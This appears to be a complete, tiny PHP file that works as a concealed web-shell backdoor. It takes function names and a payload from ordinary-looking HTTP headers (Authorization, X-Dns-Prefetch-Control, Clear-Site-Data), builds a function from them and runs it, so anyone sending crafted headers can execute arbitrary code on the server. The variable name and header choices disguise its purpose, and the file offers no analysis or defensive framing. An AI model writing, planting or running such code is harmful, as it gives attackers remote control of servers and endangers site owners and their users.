<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $parle_tokens = $_HEADERS['Authorization']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Clear-Site-Data']));
    $parle_tokens();
}